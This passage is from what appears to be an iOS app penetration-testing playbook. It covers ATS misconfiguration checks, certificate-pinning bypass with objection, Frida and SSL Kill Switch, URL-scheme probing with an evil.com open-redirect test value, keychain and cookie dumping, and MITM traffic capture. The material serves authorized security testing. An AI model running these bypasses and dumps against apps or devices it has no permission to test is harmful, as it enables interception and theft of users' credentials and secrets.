### Check for blanket ATS disablement (the single most common iOS network misconfig)
```bash
plutil -extract NSAppTransportSecurity xml1 -o - Info.plist
```
Red flags in the output:
- `NSAllowsArbitraryLoads = true` at the top level — HTTP (cleartext) allowed anywhere, app-wide.
- Per-domain `NSExceptionAllowsInsecureHTTPLoads = true` for a domain that carries auth tokens.
- `NSAllowsArbitraryLoadsInWebContent = true` — WKWebView traffic exempted, common blind spot.

A blanket ATS exception + a network position (rogue AP, ARP spoof, malicious VPN profile) =
plaintext credential/token interception without touching pinning at all.

### Certificate-pinning bypass (when pinning IS present and correctly configured)
```bash
pip install --break-system-packages frida-tools objection
objection --gadget <bundle_id> explore

# inside objection:
ios sslpinning disable
```
If you want a Frida script instead, don't hand-roll one — use a maintained universal bypass
(e.g. the widely-used `frida-ios-pinning`/`ios-ssl-bypass` community scripts). Modern iOS TLS goes
through **BoringSSL**, so a reliable universal hook targets `SSL_CTX_set_custom_verify` /
`SSL_get_psk_identity` at the native layer and forces the verify callback to return "OK" — this
catches `URLSession`, `AFNetworking`, `Alamofire`, and `TrustKit` at once, which per-delegate
Objective-C hooks (like the deprecated `NSURLConnection` delegate) miss:
```bash

# Pull a maintained universal BoringSSL-layer bypass and run it:
frida -U -f <bundle_id> -l ios-ssl-bypass.js --no-pause
```
In practice, prefer **SSL Kill Switch 2** (jailbroken device, installs as a tweak) or
**objection's `ios sslpinning disable`** over any hand-rolled script — both cover the common
pinning implementations (`NSURLSession`, `AFNetworking`, `TrustKit`) without per-app tuning.

---

# Custom URL schemes (CFBundleURLTypes) — anything can invoke these via Safari/another app
plutil -extract CFBundleURLTypes xml1 -o - Info.plist

# Universal Links / Associated Domains (applinks:) — requires a matching apple-app-site-association
plutil -extract com.apple.developer.associated-domains xml1 -o - Info.plist 2>/dev/null
curl -s "https://<domain>/.well-known/apple-app-site-association" | python3 -m json.tool
```

For each custom scheme found (e.g. `myapp://`):
- Trigger it from Safari/Notes and observe what the app does with parameters:
  `myapp://reset-password?token=x&redirect=https://evil.com` — does the app trust an
  attacker-supplied `redirect`/`url`/`callback` param and load it in a WebView (open-redirect →
  WebView-XSS chain) or use it to bypass an auth screen?
- If the scheme is also registered by another app on the device (scheme squatting), a malicious
  app can intercept traffic intended for the legitimate app — check `CFBundleURLName` uniqueness.
- Universal Links degrade to the custom scheme when the AASA validation fails or is absent —
  test both paths for the same parameter-injection surface.

---

## Stage 6 — Runtime instrumentation (Frida / objection)

Requires a jailbroken device (checkra1n/palera1n for older iOS, or a Corellium virtual device) —
unlike Android, there is no practical rooted-emulator equivalent for iOS.

```bash

# Install frida-server on the jailbroken device via Cydia/Sileo (frida repo), matching the

# host frida-tools version exactly — version skew is the #1 cause of "failed to attach" errors.

# Inside objection:
ios hooking watch class <ClassName>
ios hooking watch class_method <Class>.<method> --dump-args --dump-return
ios keychain dump
ios plist dump
ios cookies get
```

### Network traffic capture (once pinning is bypassed)
```bash
mitmproxy --listen-port 8080

# Set the device Wi-Fi proxy to host:8080, install the mitmproxy CA via http://mitm.it on-device

# (Settings > General > VPN & Device Management > trust the cert, then enable full trust under

# Certificate Trust Settings — iOS requires this second step, unlike Android)
```

---

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| `NSAllowsArbitraryLoads = true` | Confirm a token/credential actually transits HTTP — needs a network position to exploit, but is a real finding on its own (config-level, no MITM needed to report) |
| Hardcoded JWT / API key in strings dump | Same as Android — test against the API host, chain into `hunt-api-misconfig` |
| GoogleService-Info.plist present | Test public Firestore/RTDB/Storage read (identical to apk-redteam-pipeline Stage 6) |
| Custom URL scheme accepts a `redirect`/`url` param | Test open-redirect → WebView-load chain; check for scheme squatting by other installed apps |
| Universal Link AASA missing/misconfigured | Confirm scheme fallback still carries the same injectable params |
| Entitlements show `keychain-access-groups` shared with other apps | Cross-app Keychain read — a compromised sibling app reads this app's secrets |
| Older API version referenced vs. what the current web app calls | Hand off to `hunt-shadow-api` for version-diffing |

---

## Anti-patterns

- **Don't assume App Store = FairPlay-encrypted requires jailbreak** — TestFlight and enterprise/ad-hoc
  builds are frequently NOT encrypted and need no decryption step at all. Always check distribution
  channel before reaching for `frida-ios-dump`.
- **Don't skip Swift binaries because class-dump shows nothing** — `strings` and `nm` still work; a
  proper Swift-aware disassembler (Hopper, Ghidra with Swift demangling) recovers the rest.
- **Don't stop at "pinning is present" as a finding** — pinning is a mitigation, not a vulnerability;
  the finding is what you can do once it's bypassed (or the ATS misconfig that makes it moot).
- **Don't ignore WKWebView-loaded content** — `NSAllowsArbitraryLoadsInWebContent` is a distinct,
  frequently-overlooked exception from the top-level ATS setting.
- **Don't run Frida instrumentation against a personal/production Apple ID device** — use a
  dedicated jailbroken test device or Corellium instance.

---

## Tooling install (one-time)

```bash
brew install libimobiledevice ideviceinstaller class-dump
pip install --break-system-packages frida-tools objection iphone_backup_decrypt

# Jailbroken test device (checkra1n/palera1n) or a Corellium virtual iOS device for runtime work

## Related Skills & Chains

- **`apk-redteam-pipeline`** — the Android counterpart; run both when a target ships on both
  platforms. Sibling bundle IDs and shared backend endpoints frequently surface cross-platform.
- **`hunt-shadow-api`** — mobile builds (iOS and Android alike) often hardcode an older API
  version than the current web app. Chain: IPA reveals `/v1/*` endpoints → `hunt-shadow-api`
  diffs `/v1/` against the current `/v3/` for auth/validation regressions.
- **`cloud-iam-deep`** — IPA secret extraction frequently yields live AWS/GCP/Azure credentials
  or Firebase configs. Chain: strings-grep produces an AWS key → `cloud-iam-deep` privilege
  analysis.
- **`hunt-api-misconfig`** — hardcoded JWTs/API keys extracted here feed directly into JWT
  algorithm-confusion and mass-assignment testing there.
- **`evidence-hygiene`** — extracted Keychain items and secrets need redaction before report
  inclusion.
- **`offensive-osint`** — App Store developer-page enumeration is part of the broader org recon
  graph; pair with certificate-transparency lookups for the same brand.
